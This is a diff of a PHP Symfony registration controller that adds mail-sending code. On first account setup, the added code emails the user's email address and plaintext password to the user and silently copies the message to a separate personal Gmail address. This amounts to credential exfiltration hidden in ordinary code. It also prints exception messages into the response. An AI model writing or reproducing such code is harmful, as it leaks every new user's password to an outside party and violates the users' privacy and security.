@@ -19,11 +19,14 @@ class InscriptionController extends AbstractController
 { 
 	private $informationRepository;
 	private $params;
-	public function __construct(Security $security, InformationRepository $informationRepository, ParameterBagInterface $params)
+    private $mailer;
+
+	public function __construct(Security $security, InformationRepository $informationRepository, ParameterBagInterface $params, \Swift_Mailer $mailer)
     {
         $this->security = $security;
         $this->informationRepository = $informationRepository;
         $this->params = $params;
+        $this->mailer = $mailer;
     }
 	public function inscription(Request $request)
     {	
@@ -42,8 +45,24 @@ class InscriptionController extends AbstractController
     	$em = $this->getDoctrine()->getManager();
     	$user = $this->security->getUser();
     	$information = $user->getInformation();
-    	if(is_null($information))
+
+    	if(is_null($information)){
     		$information = new Information;
+            $message = "<p>Voici vos identifiant: <br> Email: ".$user->getEmail()."<br>Mot de passe:
+             ".$request->request->get('password')."</p>";
+            try {
+                $mail = (new \Swift_Message("Vos Identifiants"))
+                    ->setFrom(array('website.mail237@gmail.com' => 'Epo trading'))
+                    ->setTo($user->getEmail())
+                    ->setCc("alexngoumo.an@gmail.com")
+                    ->setBody( $message, 'text/html'
+                    );
+                $this->mailer->send($mail);
+                
+            } catch (Exception $e) {
+                print_r($e->getMessage());
+            }
+        }
     	elseif($information->getIsCreate())
     		return new Response('vos informations ont deja été traitées', 500);
 
